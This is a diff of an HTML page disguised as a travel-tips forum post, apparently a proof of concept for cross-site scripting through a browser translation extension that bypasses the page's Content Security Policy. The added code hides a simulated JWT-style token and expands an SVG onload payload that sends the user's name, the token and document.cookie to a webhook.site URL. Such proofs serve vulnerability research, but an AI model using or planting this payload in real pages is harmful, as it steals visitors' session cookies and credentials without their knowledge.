@@ -3,7 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <title>Forum Post – Travel Tips</title>
+  <!-- CSP que bloquearia execução JS normalmente -->
   <meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'self'; img-src 'self';">
+
   <style>
     body {
       font-family: sans-serif;
@@ -20,6 +22,9 @@
       font-weight: bold;
       margin-bottom: 10px;
     }
+    #token {
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -29,11 +34,20 @@
     <div class="content">
       Here's a cool travel tip!<br><br>
 
-      <!-- Payload que rouba conteúdo DOM visível -->
+      <!-- Token simulado (como um JWT, CSRF token, etc.) -->
+      <div id="token">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.payload.signature</div>
+
+      <!-- Payload SVG que executa JS via onload ao traduzir com a extensão -->
       <svg onload="
-        fetch('https://webhook.site/d828bfbf-ff5d-41db-956f-c8662ec8026a?stolen=' + encodeURIComponent(document.getElementById('user').innerText))
+        fetch('https://webhook.site/d828bfbf-ff5d-41db-956f-c8662ec8026a?' +
+          new URLSearchParams({
+            user: document.getElementById('user')?.innerText,
+            token: document.getElementById('token')?.innerText,
+            cookies: document.cookie || 'No cookies'
+          })
+        )
       ">
-        <!-- harmless looking SVG -->
+        <!-- visualmente inofensivo -->
       </svg>
 
       <p>If you're visiting Italy, make sure to try the gelato! 🍦</p>
